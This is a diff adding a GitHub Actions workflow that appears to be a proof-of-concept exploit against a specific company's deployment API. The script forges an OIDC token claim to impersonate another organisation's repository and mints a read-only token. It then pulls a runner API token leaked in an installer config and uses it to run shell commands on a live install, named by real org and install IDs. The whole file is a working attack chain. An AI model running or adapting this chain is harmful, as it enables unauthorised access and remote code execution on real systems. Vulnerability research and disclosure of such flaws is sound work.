@@ -1,0 +1,84 @@
+name: installer-readonly-rce
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Prove read-only installer download becomes root RCE
+        shell: bash
+        run: |
+          set -euo pipefail
+          org='orgl9cvkaqh1g8yv2jqdb19247'
+          azure_install='inl0hbh50qbe3p8dno3kiyb7j0'
+          execution_install='inlkuvvc4e3mdxznfis5xc6v60'
+
+          raw="$(curl -sSf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https%3A%2F%2Fapi.byoc.lovable.net" -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}")"
+          export REAL_TOKEN="$(jq -r .value <<<"$raw")"
+          request="$(python3 - <<'PY'
+          import base64,json,os
+          h,p,s=os.environ['REAL_TOKEN'].split('.')
+          fake={
+            'iss':'https://token.actions.githubusercontent.com',
+            'aud':'https://api.byoc.lovable.net',
+            'sub':'repo:lovablelabs/lovable-enterprise:ref:refs/heads/main',
+            'repository':'lovablelabs/lovable-enterprise',
+            'repository_id':'1287375944',
+            'repository_owner':'lovablelabs',
+            'repository_owner_id':'148472368',
+            'repository_visibility':'internal',
+            'ref':'refs/heads/main','ref_type':'branch','event_name':'push',
+            'workflow_ref':'lovablelabs/lovable-enterprise/.github/workflows/nuon-app-branches.yml@refs/heads/main',
+            'job_workflow_ref':'lovablelabs/lovable-enterprise/.github/workflows/nuon-app-branches.yml@refs/heads/main',
+          }
+          fp=base64.urlsafe_b64encode(json.dumps(fake,separators=(',',':')).encode()).decode().rstrip('=')
+          forged=json.dumps({'protected':h,'payload':p,'signature':s,'fake':'.'+fp+'.'},separators=(',',':'))
+          print(json.dumps({'org_id':'orgl9cvkaqh1g8yv2jqdb19247','token':forged},separators=(',',':')))
+          PY
+          )"
+          setup="$(curl -sSf 'https://api.byoc.lovable.net/v1/oidc/token' -H 'Content-Type: application/json' --data "$request")"
+          setup_token="$(jq -r .token <<<"$setup")"
+
+          readonly_response="$(jq -nc --arg name "readonly-installer-proof-${GITHUB_RUN_ID}" '{duration:"1h",name:$name,role:"org_read_only",token_identity:"service_account"}' | curl -sSf 'https://api.byoc.lovable.net/v1/account/static-token' -H "Authorization: Bearer $setup_token" -H "X-Nuon-Org-ID: $org" -H 'Content-Type: application/json' --data-binary @-)"
+          readonly_token="$(jq -r .api_token <<<"$readonly_response")"
+          readonly_me="$(curl -sSf 'https://api.byoc.lovable.net/v1/auth/me' -H "Authorization: Bearer $readonly_token" -H "X-Nuon-Org-ID: $org")"
+
+          direct_code="$(jq -nc --arg req "readonly-control-${GITHUB_RUN_ID}" '{command:"echo should-not-run",timeout:10,name:"readonly-control",request_id:$req,enable_kube_config:false}' | curl -sS -o /tmp/direct.json -w '%{http_code}' -X POST "https://api.byoc.lovable.net/v1/installs/$execution_install/actions/adhoc-run" -H "Authorization: Bearer $readonly_token" -H "X-Nuon-Org-ID: $org" -H 'Content-Type: application/json' --data-binary @-)"
+          test "$direct_code" != 200
+          test "$direct_code" != 201
+          test "$direct_code" != 202
+
+          installer="$(curl -sSf "https://api.byoc.lovable.net/v1/installs/$azure_install/generate-terraform-installer-config" -H "Authorization: Bearer $readonly_token" -H "X-Nuon-Org-ID: $org")"
+          leaked_token="$(awk -F'"' '/^nuon_api_token[[:space:]]*=/{print $2; exit}' <<<"$installer")"
+          test -n "$leaked_token"
+          leaked_me="$(curl -sSf 'https://api.byoc.lovable.net/v1/auth/me' -H "Authorization: Bearer $leaked_token" -H "X-Nuon-Org-ID: $org")"
+
+          marker="installer-readonly-rce-${GITHUB_RUN_ID}"
+          action="$(jq -nc --arg marker "$marker" --arg req "$GITHUB_RUN_ID" '{command:("echo "+$marker+" && id"),timeout:60,name:"installer-readonly-rce",request_id:("installer-readonly-rce-"+$req),enable_kube_config:false}' | curl -sSf -X POST "https://api.byoc.lovable.net/v1/installs/$execution_install/actions/adhoc-run" -H "Authorization: Bearer $leaked_token" -H "X-Nuon-Org-ID: $org" -H 'Content-Type: application/json' --data-binary @-)"
+          action_id="$(jq -r .id <<<"$action")"
+          for unused in $(seq 1 45); do
+            status="$(curl -sSf "https://api.byoc.lovable.net/v1/installs/$execution_install/actions/runs/$action_id" -H "Authorization: Bearer $leaked_token" -H "X-Nuon-Org-ID: $org")"
+            test "$(jq -r .status <<<"$status")" = finished && break
+            sleep 2
+          done
+          job_id="$(jq -r '.runner_job.id' <<<"$status")"
+          log_id="$(jq -r '.runner_job.log_stream_id' <<<"$status")"
+          proof="$(curl -sSf "https://api.byoc.lovable.net/v1/log-streams/$log_id/logs?order=asc&runner_job_id=$job_id" -H "Authorization: Bearer $leaked_token" -H "X-Nuon-Org-ID: $org" | jq -c --arg marker "$marker" '[.[] | select(.log_attributes["nuon.command_output"] == "true") | .body | select(. == $marker or startswith("uid="))]')"
+
+          jq -n \
+            --arg setup_role "$(jq -r .role <<<"$setup")" \
+            --arg readonly_account_type "$(jq -r .account_type <<<"$readonly_me")" \
+            --arg direct_action_http_status "$direct_code" \
+            --arg installer_http_method GET \
+            --arg installer_contains_runner_token "$(test -n "$leaked_token" && echo true)" \
+            --arg leaked_account_type "$(jq -r .account_type <<<"$leaked_me")" \
+            --arg leaked_role_type "$(jq -r '.roles[] | select(.role_type == "runner") | .role_type' <<<"$leaked_me")" \
+            --arg leaked_org_permission "$(jq -r --arg org "$org" '.permissions[$org]' <<<"$leaked_me")" \
+            --arg action_id "$action_id" \
+            --arg action_status "$(jq -r .status <<<"$status")" \
+            --argjson readonly_permissions "$(jq .permissions <<<"$readonly_me")" \
+            --argjson command_output "$proof" \
+            '{setup_only_existing_issue:$setup_role,readonly_account_type:$readonly_account_type,readonly_permissions:$readonly_permissions,direct_action_http_status:$direct_action_http_status,installer_http_method:$installer_http_method,installer_contains_runner_token:($installer_contains_runner_token=="true"),leaked_account_type:$leaked_account_type,leaked_role_type:$leaked_role_type,leaked_org_permission:$leaked_org_permission,action_id:$action_id,action_status:$action_status,command_output:$command_output}'
